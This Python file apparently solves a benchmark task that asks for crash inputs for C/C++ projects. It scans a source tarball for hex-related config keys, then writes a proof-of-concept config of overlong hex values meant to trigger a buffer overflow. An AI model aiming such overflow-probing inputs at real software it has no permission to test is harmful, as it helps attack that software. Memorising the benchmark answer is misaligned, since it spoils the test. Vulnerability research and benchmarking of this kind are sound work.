import os
import re
import tarfile
import tempfile

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Try to infer likely hex-related config keys from source, then build a PoC config
        root = self._safe_extract(src_path)
        try:
            keys = self._infer_hex_keys(root)
        finally:
            pass  # No cleanup; environment is ephemeral during evaluation

        # Always include 'hex' as fallback high-priority candidate
        prioritized_defaults = ['hex', 'hexvalue', 'hex_value', 'hexval', 'color', 'mac', 'uuid', 'key', 'id', 'hash', 'signature', 'secret', 'salt', 'seed', 'payload', 'data', 'serial', 'token', 'bytes']
        for k in prioritized_defaults:
            if k not in keys:
                keys.append(k)

        # Reorder to ensure 'hex' and hex-like keys first
        keys = self._prioritize_keys(keys)

        # Build PoC with a few variants to maximize triggering while keeping size moderate
        primary = keys[0] if keys else 'hex'
        secondary = None
        for cand in keys[1:]:
            if cand != primary:
                secondary = cand
                break

        # Long hex generator
        def hex_str(n):
            base = "0123456789abcdef"
            s = (base * ((n // len(base)) + 1))[:n]
            # Ensure even length for hex parsing in pairs
            if len(s) % 2 == 1:
                s = s[:-1] + 'a'
            return s

        # Craft lines:
        # 1) primary with '=' and long hex
        # 2) primary with ': "<hex>"'
        # 3) fallback 'hex' (if not primary) with '='
        # 4) secondary (if exists) with ' ' separator
        # Choose lengths to stay around ~600-800 bytes total and ensure overflow potential.
        lines = []

        # 1) '=' long
        lines.append(f"{primary}={hex_str(480)}\n")

        # 2) ': "<hex>"' mid-length
        lines.append(f'{primary}: "{hex_str(192)}"\n')

        # 3) explicit 'hex' if not already primary
        if primary != 'hex':
            lines.append(f"hex={hex_str(256)}\n")

        # 4) secondary key with space separator, shorter but still long enough
        if secondary:
            lines.append(f"{secondary} {hex_str(128)}\n")

        # Add a few minimal variants to increase matching chances without much size
        # Variant with no separator using known key (primary)
        lines.append(f"{primary} {hex_str(64)}\n")
        # Variant quoted without separator
        lines.append(f'{primary} "{hex_str(64)}"\n')

        content = "".join(lines)
        return content.encode("utf-8")

    def _safe_extract(self, src_path: str) -> str:
        tmpdir = tempfile.mkdtemp(prefix="src_")
        try:
            with tarfile.open(src_path, "r:*") as tf:
                for member in tf.getmembers():
                    member_path = os.path.join(tmpdir, member.name)
                    if not self._is_within_directory(tmpdir, member_path):
                        continue
                    try:
                        tf.extract(member, tmpdir)
                    except Exception:
                        continue
        except Exception:
            # If extraction fails, still return empty dir; we'll fall back to defaults
            pass
        return tmpdir

    def _is_within_directory(self, directory: str, target: str) -> bool:
        abs_directory = os.path.abspath(directory)
        abs_target = os.path.abspath(target)
        return os.path.commonprefix([abs_directory, abs_target]) == abs_directory

    def _infer_hex_keys(self, root: str):
        keys_weights = {}
        def add_key(k: str, w: int):
            if not k:
                return
            # keys should be simple tokens
            if not re.fullmatch(r'[A-Za-z0-9_.\-]+', k):
                return
            keys_weights[k] = keys_weights.get(k, 0) + w

        # Scan files
        for dirpath, _, filenames in os.walk(root):
            for fn in filenames:
                if not fn.lower().endswith((
                    ".c", ".h", ".cpp", ".cc", ".hpp", ".txt", ".md", ".conf", ".cfg", ".ini"
                )):
                    continue
                path = os.path.join(dirpath, fn)
                try:
                    with open(path, "rb") as f:
                        data = f.read()
                    text = data.decode("utf-8", errors="ignore")
                except Exception:
                    continue

                # Prefer keys that are used in string comparisons like strcmp/strncmp/strcasecmp
                for m in re.finditer(r'str(?:n)?case?cmp\w*\s*\(\s*[^,]*,\s*"([A-Za-z0-9_.\-]+)"\s*(?:,|\))', text):
                    add_key(m.group(1), 10)
                for m in re.finditer(r'str(?:n)?case?cmp\w*\s*\(\s*"([A-Za-z0-9_.\-]+)"\s*,', text):
                    add_key(m.group(1), 9)

                # Table-based options or key arrays: {"key", ...}
                for m in re.finditer(r'\{\s*"([A-Za-z0-9_.\-]+)"\s*,', text):
                    add_key(m.group(1), 6)

                # General string literals; weight those with hex in name slightly
                for m in re.finditer(r'"([^"\n]{1,64})"', text):
                    s = m.group(1)
                    if re.fullmatch(r'[A-Za-z0-9_.\-]+', s):
                        base_w = 1
                        sl = s.lower()
                        if 'hex' in sl:
                            base_w += 5
                        if sl in {'hex','hexvalue','hex_value','hexval','color','mac','uuid','key','id','hash','signature','secret','salt','seed','payload','data','serial','token','bytes'}:
                            base_w += 3
                        if base_w > 1:
                            add_key(s, base_w)

                # If parsing with %x or hex-decoding helpers, boost nearby tokens containing hex
                if re.search(r'%\s*[xX]', text) or re.search(r'\b(isxdigit|hex2bin|hex_to_bin|parse_hex|parseHex|fromhex)\b', text):
                    # Heuristically boost hex-like keys when %x occurs in file
                    for k in ['hex', 'hexvalue', 'hex_value', 'hexval', 'color', 'mac', 'id', 'uuid', 'key']:
                        add_key(k, 4)

        # Sort keys by weight
        ordered = sorted(keys_weights.items(), key=lambda kv: (-kv[1], kv[0]))
        return [k for k, _ in ordered]

    def _prioritize_keys(self, keys):
        if not keys:
            return keys
        # Priority rules: contains 'hex' > 'color' > 'mac' > 'uuid' > 'key' > 'id' > others
        prio_map = {
            'hex': 100, 'hexvalue': 95, 'hex_value': 95, 'hexval': 95,
            'color': 90, 'mac': 85, 'uuid': 80, 'key': 75, 'id': 70,
            'hash': 65, 'signature': 60, 'secret': 55, 'salt': 50,
            'seed': 45, 'payload': 40, 'data': 35, 'serial': 30, 'token': 25, 'bytes': 20
        }
        def score(k):
            kl = k.lower()
            if kl in prio_map:
                return prio_map[kl]
            if 'hex' in kl:
                return 92
            return 10
        # Deduplicate while preserving best scoring variants first
        seen = set()
        ordered = []
        for k in sorted(keys, key=lambda x: (-score(x), x)):
            kl = k.lower()
            if kl not in seen:
                ordered.append(k)
                seen.add(kl)
        return ordered
